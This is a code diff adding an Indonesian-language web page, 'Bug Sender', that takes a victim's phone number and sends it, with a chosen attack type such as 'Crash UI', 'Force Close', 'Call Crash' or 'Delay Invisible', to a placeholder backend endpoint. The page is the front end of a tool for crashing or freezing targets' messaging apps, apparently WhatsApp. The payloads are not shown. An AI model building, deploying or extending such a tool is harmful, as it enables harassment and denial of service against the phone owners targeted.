@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Bug Sender Web</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#101820; color:#fff; text-align:center; }
+    .container { margin-top: 50px; }
+    input, select, button { padding:10px; margin:10px; border-radius:8px; }
+    button { background:#00bfff; border:none; cursor:pointer; color:white; }
+    button:hover { background:#0099cc; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>⚡ BUG SENDER ⚡</h1>
+    <input type="text" id="nomor" placeholder="Masukkan nomor target 628xxx" />
+    <select id="bugType">
+      <option value="delay-hard">Delay Hard</option>
+      <option value="delayxbeta">Delay Hard2</option>
+      <option value="flo-delayv1">Delay Easy</option>
+      <option value="delay-invis">Delay Invisible</option>
+      <option value="riexxinvis">Crash Invis</option>
+      <option value="attack-ui">Crash UI</option>
+      <option value="freeze">Force Close</option>
+      <option value="callxcrash">Call Crash</option>
+      <option value="crash-notif">Notif Crash</option>
+      <option value="forcexdelay">ForceCloseXDelay</option>
+    </select>
+    <br/>
+    <button onclick="kirim()">🚀 Kirim Bug</button>
+  </div>
+
+  <script>
+    async function kirim() {
+      const nomor = document.getElementById("nomor").value;
+      const bugType = document.getElementById("bugType").value;
+
+      const res = await fetch("https://NAMA_BACKEND.onrender.com/send-bug", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ nomor, bugType })
+      });
+
+      const data = await res.json();
+      alert(data.message);
+    }
+  </script>
+</body>
+</html>
